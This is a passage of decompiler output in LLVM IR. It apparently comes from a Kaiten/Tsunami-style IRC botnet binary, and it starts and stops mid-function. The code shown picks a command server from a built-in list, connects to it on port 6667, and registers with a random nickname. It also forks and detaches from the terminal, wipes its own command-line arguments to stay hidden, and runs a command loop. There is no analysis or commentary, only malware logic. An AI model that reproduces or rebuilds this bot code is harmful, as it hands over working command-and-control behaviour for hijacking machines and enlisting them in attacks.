  store i32 %v1_1001215c, i32* @global_var_10045198.65, align 4
  ret i32 %v1_1001215c
}

define i32 @_NICK(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  %v0_100121c83 = call i32 @__GI_strlen()
  %v2_100121d05 = icmp eq i32 %v0_100121c83, 0
  br i1 %v2_100121d05, label %dec_label_pc_100121f8, label %dec_label_pc_100121d8

dec_label_pc_100121b4:                            ; preds = %dec_label_pc_100121d8
  %v1_100121b8 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_100121c8 = call i32 @__GI_strlen()
  %v2_100121d0 = icmp ult i32 %v1_100121b8, %v0_100121c8
  br i1 %v2_100121d0, label %dec_label_pc_100121d8, label %dec_label_pc_100121f8

dec_label_pc_100121d8:                            ; preds = %entry, %dec_label_pc_100121b4
  %storemerge28 = phi i32 [ %v1_100121b8, %dec_label_pc_100121b4 ], [ 0, %entry ]
  %v2_100121e4 = add i32 %storemerge28, %arg2
  %v1_100121e8 = inttoptr i32 %v2_100121e4 to i8*
  %v2_100121e8 = load i8, i8* %v1_100121e8, align 1
  %v3_100121f0 = icmp eq i8 %v2_100121e8, 33
  br i1 %v3_100121f0, label %dec_label_pc_100121f8, label %dec_label_pc_100121b4

dec_label_pc_100121f8:                            ; preds = %entry, %dec_label_pc_100121b4, %dec_label_pc_100121d8
  %storemerge2.lcssa = phi i32 [ 0, %entry ], [ %v1_100121b8, %dec_label_pc_100121b4 ], [ %storemerge28, %dec_label_pc_100121d8 ]
  %v2_10012204 = add i32 %storemerge2.lcssa, %arg2
  %v3_1001220c = inttoptr i32 %v2_10012204 to i8*
  store i8 0, i8* %v3_1001220c, align 1
  %v3_10012214 = load i32, i32* @global_var_10045198.65, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10012214, i32* @r4, align 4
  %v2_10012220 = call i32 @__GI_strcasecmp(i32 %arg2, i32 %v3_10012214)
  %v3_10012228 = icmp eq i32 %v2_10012220, 0
  br i1 %v3_10012228, label %dec_label_pc_10012230, label %dec_label_pc_10012294

dec_label_pc_10012230:                            ; preds = %dec_label_pc_100121f8
  %v2_10012234 = load i8, i8* %arg3, align 1
  %v3_1001223c = icmp eq i8 %v2_10012234, 58
  br i1 %v3_1001223c, label %dec_label_pc_10012244, label %dec_label_pc_10012250

dec_label_pc_10012244:                            ; preds = %dec_label_pc_10012230
  br label %dec_label_pc_10012250

dec_label_pc_10012250:                            ; preds = %dec_label_pc_10012230, %dec_label_pc_10012244
  %v3_10012254 = load i32, i32* @global_var_10045198.65, align 4
  %v3_10012258 = icmp eq i32 %v3_10012254, 0
  br i1 %v3_10012258, label %dec_label_pc_10012270, label %dec_label_pc_10012260

dec_label_pc_10012260:                            ; preds = %dec_label_pc_10012250
  store i32 %v3_10012254, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012270.931 to i32), i32* @lr, align 4
  %v0_1001226c = call i32 @free()
  br label %dec_label_pc_10012270

dec_label_pc_10012270:                            ; preds = %dec_label_pc_10012250, %dec_label_pc_10012260
  store i32 268509820, i32* @lr, align 4
  %v2_10012278 = call i32 @realrand(i32 4, i32 8)
  store i32 268509832, i32* @lr, align 4
  %v1_10012284 = call i32 @randstring(i32 %v2_10012278)
  store i32 %v1_10012284, i32* @global_var_10045198.65, align 4
  br label %dec_label_pc_10012294

dec_label_pc_10012294:                            ; preds = %dec_label_pc_100121f8, %dec_label_pc_10012270
  %v0_100122ac = phi i32 [ %v2_10012220, %dec_label_pc_100121f8 ], [ %v1_10012284, %dec_label_pc_10012270 ]
  ret i32 %v0_100122ac

; uselistorder directives
  uselistorder i32 %v1_100121b8, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10012294, { 1, 0 }
  uselistorder label %dec_label_pc_10012270, { 1, 0 }
  uselistorder label %dec_label_pc_10012250, { 1, 0 }
  uselistorder label %dec_label_pc_100121f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100121d8, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 4, i32* %stack_var_-36, align 4
  %v3_100122d8 = load i32, i32* @global_var_1004519c.24, align 4
  %v2_100122dc = ptrtoint i32* %stack_var_-40 to i32
  %v2_100122e0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 268509948, i32* @lr, align 4
  %v5_100122f8 = call i32 @getsockopt(i32 %v3_100122d8, i32 1, i32 4, i32 %v2_100122dc, i32 %v2_100122e0)
  %v3_10012308 = icmp eq i32 %v5_100122f8, 0
  br i1 %v3_10012308, label %dec_label_pc_10012310, label %dec_label_pc_10012320.preheader

dec_label_pc_10012310:                            ; preds = %entry
  %v3_10012310 = load i32, i32* %stack_var_-40, align 4
  %v3_10012314 = icmp eq i32 %v3_10012310, 0
  br i1 %v3_10012314, label %dec_label_pc_100125ec, label %dec_label_pc_10012320.preheader

dec_label_pc_10012320.preheader:                  ; preds = %entry, %dec_label_pc_10012310
  %v2_10012440 = ptrtoint i32* %stack_var_-32 to i32
  %v2_10012444 = ptrtoint i32* %stack_var_-28 to i32
  %v2_1001249c = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_10012320

dec_label_pc_10012320:                            ; preds = %dec_label_pc_10012320.backedge, %dec_label_pc_10012320.preheader
  store i32 -1, i32* @global_var_1004519c.24, align 4
  store i32 1, i32* %stack_var_-16, align 4
  %v3_10012338 = load i32, i32* @global_var_1004516c.743, align 4
  %v3_1001233c = icmp eq i32 %v3_10012338, 0
  br i1 %v3_1001233c, label %dec_label_pc_10012344, label %dec_label_pc_1001237c

dec_label_pc_10012344:                            ; preds = %dec_label_pc_10012320
  store i32 268510024, i32* @lr, align 4
  %v0_10012344 = call i32 @random()
  %v3_10012350 = load i32, i32* @global_var_100450b8.932, align 4
  %v2_10012354 = srem i32 %v0_10012344, %v3_10012350
  %v1_10012368 = mul i32 %v2_10012354, 4
  %v2_1001236c = add i32 %v1_10012368, ptrtoint ([14 x i8]** @global_var_100450bc.934 to i32)
  %v1_10012370 = inttoptr i32 %v2_1001236c to i32*
  %v2_10012370 = load i32, i32* %v1_10012370, align 4
  store i32 %v2_10012370, i32* @global_var_100451b0.742, align 4
  br label %dec_label_pc_1001237c

dec_label_pc_1001237c:                            ; preds = %dec_label_pc_10012320, %dec_label_pc_10012344
  store i32 0, i32* @global_var_1004516c.743, align 4
  br label %dec_label_pc_10012388

dec_label_pc_10012388:                            ; preds = %dec_label_pc_10012388, %dec_label_pc_1001237c
  store i32 268510104, i32* @lr, align 4
  %v3_10012394 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_10012394, i32* @global_var_1004519c.24, align 4
  %v1_100123ac = icmp slt i32 %v3_10012394, 0
  br i1 %v1_100123ac, label %dec_label_pc_10012388, label %dec_label_pc_100123b4

dec_label_pc_100123b4:                            ; preds = %dec_label_pc_10012388
  %v3_100123b8 = load i32, i32* @global_var_100451b0.742, align 4
  store i32 268510148, i32* @lr, align 4
  %v1_100123c0 = call i32 @inet_addr(i32 %v3_100123b8)
  %v3_100123c8 = icmp eq i32 %v1_100123c0, 0
  br i1 %v3_100123c8, label %dec_label_pc_100123f0, label %dec_label_pc_100123d0

dec_label_pc_100123d0:                            ; preds = %dec_label_pc_100123b4
  %v3_100123d4 = load i32, i32* @global_var_100451b0.742, align 4
  store i32 268510176, i32* @lr, align 4
  %v1_100123dc = call i32 @inet_addr(i32 %v3_100123d4)
  %v4_100123e8 = icmp eq i32 %v1_100123dc, -1
  br i1 %v4_100123e8, label %dec_label_pc_100123f0, label %dec_label_pc_10012464

dec_label_pc_100123f0:                            ; preds = %dec_label_pc_100123d0, %dec_label_pc_100123b4
  %v3_100123f4 = load i32, i32* @global_var_100451b0.742, align 4
  store i32 268510208, i32* @lr, align 4
  %v1_100123fc = call i32 @__GI_gethostbyname(i32 %v3_100123f4)
  %v3_1001240c = icmp eq i32 %v1_100123fc, 0
  br i1 %v3_1001240c, label %dec_label_pc_10012414, label %dec_label_pc_10012434

dec_label_pc_10012414:                            ; preds = %dec_label_pc_100123f0
  store i32 0, i32* @global_var_100451b0.742, align 4
  %v3_10012424 = load i32, i32* @global_var_1004519c.24, align 4
  store i32 268510256, i32* @lr, align 4
  %v1_1001242c = call i32 @close(i32 %v3_10012424)
  br label %dec_label_pc_10012320.backedge

dec_label_pc_10012320.backedge:                   ; preds = %dec_label_pc_10012414, %dec_label_pc_100125cc
  br label %dec_label_pc_10012320

dec_label_pc_10012434:                            ; preds = %dec_label_pc_100123f0
  %v1_10012438 = add i32 %v1_100123fc, 16
  %v2_10012438 = inttoptr i32 %v1_10012438 to i32*
  %v3_10012438 = load i32, i32* %v2_10012438, align 4
  %v1_1001243c = inttoptr i32 %v3_10012438 to i32*
  %v2_1001243c = load i32, i32* %v1_1001243c, align 4
  %v1_1001244c = add i32 %v1_100123fc, 12
  %v2_1001244c = inttoptr i32 %v1_1001244c to i32*
  %v3_1001244c = load i32, i32* %v2_1001244c, align 4
  store i32 %v3_1001244c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10012460.935 to i32), i32* @lr, align 4
  %v4_1001245c = call i32 @bcopy(i32 %v2_1001243c, i32 %v2_10012444, i32 %v3_1001244c, i32 %v1_100123fc)
  br label %dec_label_pc_1001247c

dec_label_pc_10012464:                            ; preds = %dec_label_pc_100123d0
  %v3_10012468 = load i32, i32* @global_var_100451b0.742, align 4
  store i32 268510324, i32* @lr, align 4
  %v1_10012470 = call i32 @inet_addr(i32 %v3_10012468)
  store i32 %v1_10012470, i32* %stack_var_-28, align 4
  br label %dec_label_pc_1001247c

dec_label_pc_1001247c:                            ; preds = %dec_label_pc_10012434, %dec_label_pc_10012464
  store i32 2, i32* %stack_var_-32, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10012488 = call i32 @htons(i32 6667)
  %v3_10012498 = load i32, i32* @global_var_1004519c.24, align 4
  store i32 %v3_10012498, i32* @r3, align 4
  store i32 -2147195266, i32* @r4, align 4
  store i32 %v2_1001249c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100124b8.936 to i32), i32* @lr, align 4
  %v0_100124b4 = call i32 @ioctl()
  store i32 268510400, i32* @lr, align 4
  %v1_100124bc = call i32 @__GI_time(i32 0)
  store i32 268510644, i32* @lr, align 4
  %v1_100125b015 = call i32 @__GI_time(i32 0)
  %v2_100125c016 = sub i32 %v1_100125b015, %v1_100124bc
  %tmp1420 = icmp ult i32 %v2_100125c016, 10
  br i1 %tmp1420, label %dec_label_pc_100124cc, label %dec_label_pc_100125cc

dec_label_pc_100124cc:                            ; preds = %dec_label_pc_1001247c, %dec_label_pc_100125a4
  %v0_100124cc = call i32 @__errno_location()
  %v2_100124d8 = inttoptr i32 %v0_100124cc to i32*
  store i32 0, i32* %v2_100124d8, align 4
  %v3_100124e0 = load i32, i32* @global_var_1004519c.24, align 4
  store i32 268510456, i32* @lr, align 4
  %v3_100124f4 = call i32 @connect(i32 %v3_100124e0, i32 %v2_10012440, i32 16)
  %v3_100124fc = icmp eq i32 %v3_100124f4, 0
  br i1 %v3_100124fc, label %dec_label_pc_10012518, label %dec_label_pc_10012504

dec_label_pc_10012504:                            ; preds = %dec_label_pc_100124cc
  %v0_10012504 = call i32 @__errno_location()
  %v1_1001250c = inttoptr i32 %v0_10012504 to i32*
  %v2_1001250c = load i32, i32* %v1_1001250c, align 4
  %v3_10012510 = icmp eq i32 %v2_1001250c, 106
  br i1 %v3_10012510, label %dec_label_pc_10012518, label %dec_label_pc_1001257c

dec_label_pc_10012518:                            ; preds = %dec_label_pc_10012504, %dec_label_pc_100124cc
  %v3_1001251c = load i32, i32* @global_var_1004519c.24, align 4
  store i32 268510520, i32* @lr, align 4
  %v5_10012534 = call i32 @__GI_setsockopt(i32 %v3_1001251c, i32 1, i32 13, i32 0, i32 0)
  %v3_1001253c = load i32, i32* @global_var_1004519c.24, align 4
  store i32 268510552, i32* @lr, align 4
  %v5_10012554 = call i32 @__GI_setsockopt(i32 %v3_1001253c, i32 1, i32 2, i32 0, i32 0)
  %v3_1001255c = load i32, i32* @global_var_1004519c.24, align 4
  store i32 ptrtoint (i32* @global_var_10012578.937 to i32), i32* @lr, align 4
  %v5_10012574 = call i32 @__GI_setsockopt(i32 %v3_1001255c, i32 1, i32 9, i32 0, i32 0)
  br label %dec_label_pc_100125ec

dec_label_pc_1001257c:                            ; preds = %dec_label_pc_10012504
  %v0_1001257c = call i32 @__errno_location()
  %v1_10012584 = inttoptr i32 %v0_1001257c to i32*
  %v2_10012584 = load i32, i32* %v1_10012584, align 4
  %v3_10012588 = icmp eq i32 %v2_10012584, 115
  br i1 %v3_10012588, label %dec_label_pc_100125a4, label %dec_label_pc_10012590

dec_label_pc_10012590:                            ; preds = %dec_label_pc_1001257c
  %v0_10012590 = call i32 @__errno_location()
  %v1_10012598 = inttoptr i32 %v0_10012590 to i32*
  %v2_10012598 = load i32, i32* %v1_10012598, align 4
  %v3_1001259c = icmp eq i32 %v2_10012598, 114
  br i1 %v3_1001259c, label %dec_label_pc_100125a4, label %dec_label_pc_100125cc

dec_label_pc_100125a4:                            ; preds = %dec_label_pc_10012590, %dec_label_pc_1001257c
  store i32 ptrtoint ([3 x i8]* @global_var_100125ac.938 to i32), i32* @lr, align 4
  %v1_100125a8 = call i32 @sleep(i32 1)
  store i32 268510644, i32* @lr, align 4
  %v1_100125b0 = call i32 @__GI_time(i32 0)
  %v2_100125c0 = sub i32 %v1_100125b0, %v1_100124bc
  %tmp14 = icmp ult i32 %v2_100125c0, 10
  br i1 %tmp14, label %dec_label_pc_100124cc, label %dec_label_pc_100125cc

dec_label_pc_100125cc:                            ; preds = %dec_label_pc_100125a4, %dec_label_pc_10012590, %dec_label_pc_1001247c
  store i32 0, i32* @global_var_100451b0.742, align 4
  %v3_100125dc = load i32, i32* @global_var_1004519c.24, align 4
  store i32 268510696, i32* @lr, align 4
  %v1_100125e4 = call i32 @close(i32 %v3_100125dc)
  br label %dec_label_pc_10012320.backedge

dec_label_pc_100125ec:                            ; preds = %dec_label_pc_10012310, %dec_label_pc_10012518
  %v0_10012600 = phi i32 [ 0, %dec_label_pc_10012310 ], [ %v5_10012574, %dec_label_pc_10012518 ]
  ret i32 %v0_10012600

; uselistorder directives
  uselistorder i32 %v1_100124bc, { 1, 0 }
  uselistorder i32 %v3_1001244c, { 1, 0 }
  uselistorder i32 %v1_100123fc, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 115, { 1, 0, 2, 3, 4 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @connect, { 8, 7, 6, 9, 1, 5, 4, 3, 2, 0 }
  uselistorder i32 268510644, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 64, 63, 62, 65, 61, 6, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 3, 2, 1, 0, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100125ec, { 1, 0 }
  uselistorder label %dec_label_pc_100124cc, { 1, 0 }
  uselistorder label %dec_label_pc_1001247c, { 1, 0 }
  uselistorder label %dec_label_pc_10012320.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1001237c, { 1, 0 }
  uselistorder label %dec_label_pc_10012320.preheader, { 1, 0 }
}

define i32 @makeFukdString(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268510764, i32* @lr, align 4
  %v1_10012628 = call i32 @__GI_time(i32 0)
  store i32 %v1_10012628, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012638.939 to i32), i32* @lr, align 4
  %v1_10012634 = call i32 @srand(i32 %v1_10012628)
  store i32 %v1_10012634, i32* %r3.global-to-local, align 4
  %v2_100126bc2 = icmp sgt i32 %arg2, 0
  br i1 %v2_100126bc2, label %dec_label_pc_1001264c, label %dec_label_pc_100126c4

dec_label_pc_1001264c:                            ; preds = %entry, %dec_label_pc_1001264c
  %storemerge15 = phi i32 [ %v1_100126ac, %dec_label_pc_1001264c ], [ 0, %entry ]
  store i32 268510816, i32* @lr, align 4
  %v0_1001265c = call i32 @random()
  store i32 %v0_1001265c, i32* %r3.global-to-local, align 4
  %v2_1001267c = srem i32 %v0_1001265c, 223
  %fold = add nsw i32 %v2_1001267c, 33
  %v1_100126a4 = trunc i32 %fold to i8
  %v2_100126a4 = load i32, i32* @r29, align 4
  %v3_100126a4 = inttoptr i32 %v2_100126a4 to i8*
  store i8 %v1_100126a4, i8* %v3_100126a4, align 1
  %v1_100126ac = add nuw nsw i32 %storemerge15, 1
  %v2_100126bc = icmp slt i32 %v1_100126ac, %arg2
  br i1 %v2_100126bc, label %dec_label_pc_1001264c, label %dec_label_pc_100126b4.dec_label_pc_100126c4_crit_edge

dec_label_pc_100126b4.dec_label_pc_100126c4_crit_edge: ; preds = %dec_label_pc_1001264c
  %v0_100126dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100126c4

dec_label_pc_100126c4:                            ; preds = %dec_label_pc_100126b4.dec_label_pc_100126c4_crit_edge, %entry
  %v0_100126dc = phi i32 [ %v0_100126dc.pre, %dec_label_pc_100126b4.dec_label_pc_100126c4_crit_edge ], [ %v1_10012634, %entry ]
  ret i32 %v0_100126dc

; uselistorder directives
  uselistorder i32 %v1_100126ac, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1001264c, { 1, 0 }
}

define i32 @touchMyself(i32* %arg1) local_unnamed_addr {
entry:
  store i32 268510976, i32* @lr, align 4
  %v0_100126fc = call i32 @fork()
  %v3_10012704 = icmp eq i32 %v0_100126fc, 0
  br i1 %v3_10012704, label %dec_label_pc_1001270c, label %dec_label_pc_10012748

dec_label_pc_1001270c:                            ; preds = %entry, %dec_label_pc_1001270c
  store i32 268511000, i32* @lr, align 4
  %v0_10012714 = call i32 @random()
  %v2_10012728 = urem i32 %v0_10012714, 128
  %v1_1001272c = or i32 %v2_10012728, 1024
  %v0_10012730 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001273c.940 to i32), i32* @lr, align 4
  %v3_10012738 = call i32 @makeFukdString(i32 %v0_10012730, i32 %v1_1001272c, i32 %v2_10012728)
  store i32 268511044, i32* @lr, align 4
  %v1_10012740 = call i32 @sleep(i32 3)
  br label %dec_label_pc_1001270c

dec_label_pc_10012748:                            ; preds = %entry
  ret i32 %v0_100126fc

; uselistorder directives
  uselistorder label %dec_label_pc_1001270c, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-6180 = alloca i32, align 4
  %stack_var_-5156 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-6316 = alloca i32, align 4
  %stack_var_-6616 = alloca i32, align 4
  %stack_var_-6308 = alloca i32, align 4
  %stack_var_-20 = alloca i8**, align 4
  store i8** %argv, i8*** %stack_var_-20, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012788.941 to i32), i32* @lr, align 4
  %v0_10012784 = call i32 @__GI_setsid()
  store i32 ptrtoint (i32* @global_var_10012794.942 to i32), i32* @lr, align 4
  %v2_10012790 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 268511128, i32* @lr, align 4
  %v0_10012794 = call i32 @fork()
  %v3_1001279c = icmp eq i32 %v0_10012794, 0
  br i1 %v3_1001279c, label %dec_label_pc_10012f68, label %dec_label_pc_100127a4

dec_label_pc_100127a4:                            ; preds = %entry
  store i32 268511152, i32* @lr, align 4
  %v1_100127ac = bitcast i8*** %stack_var_-20 to i32*
  %v2_100127ac = call i32 @touchMyself(i32* %v1_100127ac)
  store i32 1936027248, i32* @r10, align 4
  store i32 1634290035, i32* @r8, align 4
  store i32 1265990245, i32* @global_var_1004db70.78, align 4
  store i8* inttoptr (i32 1936027248 to i8*), i8** @global_var_1004db74.947, align 4
  store i8* inttoptr (i32 1634290035 to i8*), i8** @global_var_1004db78.948, align 4
  store i8* inttoptr (i32 1500476786 to i8*), i8** @global_var_1004db7c.949, align 4
  store i8* inttoptr (i32 1198482432 to i8*), i8** @global_var_1004db80.951, align 4
  %v2_1001285448 = icmp sgt i32 %argc, 1
  br i1 %v2_1001285448, label %dec_label_pc_100127f4, label %dec_label_pc_1001285c

dec_label_pc_100127f4:                            ; preds = %dec_label_pc_100127a4, %dec_label_pc_100127f4
  %storemerge1151 = phi i32 [ %v1_10012844, %dec_label_pc_100127f4 ], [ 1, %dec_label_pc_100127a4 ]
  %v1_100127f8 = mul i32 %storemerge1151, 4
  %v3_10012800 = load i8**, i8*** %stack_var_-20, align 4
  %v4_10012800 = ptrtoint i8** %v3_10012800 to i32
  %v2_10012804 = add i32 %v4_10012800, %v1_100127f8
  %v1_10012808 = inttoptr i32 %v2_10012804 to i32*
  %v2_10012808 = load i32, i32* %v1_10012808, align 4
  store i32 %v2_10012808, i32* @r3, align 4
  %v0_10012828 = call i32 @__GI_strlen()
  store i32 %v2_10012808, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v0_10012828, i32* @r5, align 4
  store i32 268511296, i32* @lr, align 4
  %v0_1001283c = call i32 @__GI_memset()
  %v1_10012844 = add nuw nsw i32 %storemerge1151, 1
  %v2_10012854 = icmp slt i32 %v1_10012844, %argc
  br i1 %v2_10012854, label %dec_label_pc_100127f4, label %dec_label_pc_1001285c

dec_label_pc_1001285c:                            ; preds = %dec_label_pc_100127f4, %dec_label_pc_100127a4
  store i32 268511332, i32* @lr, align 4
  %v1_10012860 = call i32 @__GI_time(i32 0)
  store i32 268511340, i32* @lr, align 4
  %v0_10012868 = call i32 @__libc_getpid()
  %v2_10012870 = xor i32 %v1_10012860, %v0_10012868
  store i32 268511352, i32* @lr, align 4
  %v0_10012874 = call i32 @getppid()
  %v2_1001287c = add i32 %v2_10012870, %v0_10012874
  store i32 ptrtoint ([3 x i8]* @global_var_10012888.952 to i32), i32* @lr, align 4
  %v1_10012884 = call i32 @srand(i32 %v2_1001287c)
  store i32 268511380, i32* @lr, align 4
  %v2_10012890 = call i32 @realrand(i32 4, i32 8)
  store i32 268511392, i32* @lr, align 4
  %v1_1001289c = call i32 @randstring(i32 %v2_10012890)
  store i32 %v1_1001289c, i32* @global_var_10045198.65, align 4
  store i32 268511416, i32* @lr, align 4
  %v2_100128b4 = call i32 @realrand(i32 4, i32 8)
  store i32 268511428, i32* @lr, align 4
  %v1_100128c0 = call i32 @randstring(i32 %v2_100128b4)
  store i32 %v1_100128c0, i32* @global_var_10045190.32, align 4
  store i32 268511452, i32* @lr, align 4
  %v2_100128d8 = call i32 @realrand(i32 4, i32 8)
  store i32 268511464, i32* @lr, align 4
  %v1_100128e4 = call i32 @randstring(i32 %v2_100128d8)
  store i32 %v1_100128e4, i32* @global_var_100451a8.953, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002e070.954 to i32), i32* @global_var_100451c4.545, align 4
  store i32 ptrtoint (i32* @global_var_1002e078.955 to i32), i32* @global_var_100451bc.921, align 4
  store i32 0, i32* @global_var_100451b0.742, align 4
  %v2_10012980 = ptrtoint i32* %stack_var_-6308 to i32
  %v2_100129d8 = ptrtoint i32* %stack_var_-6616 to i32
  %v2_100129dc = add i32 %v2_100129d8, 308
  %v2_10012a34 = ptrtoint i32* %stack_var_-6316 to i32
  %v2_10012c48 = ptrtoint i32* %stack_var_-4132 to i32
  %v2_10012d34 = ptrtoint i32* %stack_var_-5156 to i32
  %v2_10012ddc = ptrtoint i32* %stack_var_-6180 to i32
  %v2_10012c7c = add i32 %v2_100129d8, 2484
  br label %dec_label_pc_10012924

dec_label_pc_10012924:                            ; preds = %dec_label_pc_10012f10, %dec_label_pc_10012c40, %dec_label_pc_100129c4, %dec_label_pc_1001285c
  %v0_10012924 = call i32 @con()
  %v3_1001292c = load i32, i32* @global_var_1004519c.24, align 4
  %v2_10012930 = call i32 @getBuild(i32 %v0_10012924)
  %v3_10012944 = load i32, i32* @global_var_100451a8.953, align 4
  store i32 %v3_10012944, i32* @r8, align 4
  %v9_10012978 = call i32 @Send(i32 %v3_1001292c, i32 ptrtoint ([48 x i8]* @global_var_1002e07c.956 to i32), i32 ptrtoint ([8 x i8]* @global_var_1002a3e4.68 to i32), i32 %v2_10012930)
  br label %dec_label_pc_10012980

dec_label_pc_10012980:                            ; preds = %dec_label_pc_10012c00, %dec_label_pc_10012c74, %dec_label_pc_10012f2c, %dec_label_pc_10012f50, %dec_label_pc_10012924
  br label %dec_label_pc_10012994

dec_label_pc_10012994:                            ; preds = %dec_label_pc_10012980, %dec_label_pc_10012994
  %storemerge1223 = phi i32 [ 0, %dec_label_pc_10012980 ], [ %v1_100129b0, %dec_label_pc_10012994 ]
  %v1_1001299c = mul nuw nsw i32 %storemerge1223, 4
  %v2_100129a0 = add i32 %v1_1001299c, %v2_10012980
  %v2_100129a8 = inttoptr i32 %v2_100129a0 to i32*
  store i32 0, i32* %v2_100129a8, align 4
  %v1_100129b0 = add nuw nsw i32 %storemerge1223, 1
  %tmp73 = icmp ult i32 %v1_100129b0, 32
  br i1 %tmp73, label %dec_label_pc_10012994, label %dec_label_pc_100129c4

dec_label_pc_100129c4:                            ; preds = %dec_label_pc_10012994
  %v3_100129c8 = load i32, i32* @global_var_1004519c.24, align 4
  %v1_100129cc = udiv i32 %v3_100129c8, 32
  store i32 %v1_100129cc, i32* @r10, align 4
  %v1_100129d4 = mul nuw nsw i32 %v1_100129cc, 4
  %v1_100129e0 = add i32 %v1_100129d4, %v2_100129dc
  %v1_100129e4 = inttoptr i32 %v1_100129e0 to i32*
  %v2_100129e4 = load i32, i32* %v1_100129e4, align 4
  %v1_100129f0 = urem i32 %v3_100129c8, 32
  %v3_100129f8 = shl i32 1, %v1_100129f0
  %v2_100129fc = or i32 %v2_100129e4, %v3_100129f8
  store i32 %v2_100129fc, i32* %v1_100129e4, align 4
  store i32 1200, i32* %stack_var_-6316, align 4
  %v3_10012a28 = load i32, i32* @global_var_1004519c.24, align 4
  %v1_10012a2c = add i32 %v3_10012a28, 1
  store i32 268511824, i32* @lr, align 4
  %v5_10012a4c = call i32 @__libc_select(i32 %v1_10012a2c, i32 %v2_10012980, i32 0, i32 0, i32 %v2_10012a34)
  %tmp74 = icmp slt i32 %v5_10012a4c, 1
  br i1 %tmp74, label %dec_label_pc_10012924, label %dec_label_pc_10012bec.preheader

dec_label_pc_10012bec.preheader:                  ; preds = %dec_label_pc_100129c4
  %v3_10012bf028 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012bf829 = icmp eq i32 %v3_10012bf028, 0
  br i1 %v2_10012bf829, label %dec_label_pc_10012c00, label %dec_label_pc_10012a68

dec_label_pc_10012a68:                            ; preds = %dec_label_pc_10012bec.preheader, %dec_label_pc_10012be0
  %storemerge1331 = phi i32 [ %.pre, %dec_label_pc_10012be0 ], [ 0, %dec_label_pc_10012bec.preheader ]
  %v1_10012a6c = mul i32 %storemerge1331, 4
  %v3_10012a78 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10012a7c = add i32 %v3_10012a78, %v1_10012a6c
  %v1_10012a80 = inttoptr i32 %v2_10012a7c to i32*
  %v2_10012a80 = load i32, i32* %v1_10012a80, align 4
  store i32 268511892, i32* @lr, align 4
  %v3_10012a90 = call i32 @waitpid(i32 %v2_10012a80, i32 0, i32 1)
  %tmp75 = icmp slt i32 %v3_10012a90, 1
  %.pre = add i32 %storemerge1331, 1
  br i1 %tmp75, label %dec_label_pc_10012be0, label %dec_label_pc_10012af8.preheader

dec_label_pc_10012af8.preheader:                  ; preds = %dec_label_pc_10012a68
  %v3_10012afc78 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012b0479 = icmp ult i32 %.pre, %v3_10012afc78
  %v1_10012ab480 = mul i32 %.pre, 4
  %v3_10012ac081 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10012ac482 = add i32 %v3_10012ac081, %v1_10012ab480
  br i1 %v2_10012b0479, label %dec_label_pc_10012ab0, label %dec_label_pc_10012b0c

dec_label_pc_10012ab0:                            ; preds = %dec_label_pc_10012af8.preheader, %dec_label_pc_10012ab0
  %v2_10012ac486 = phi i32 [ %v2_10012ac4, %dec_label_pc_10012ab0 ], [ %v2_10012ac482, %dec_label_pc_10012af8.preheader ]
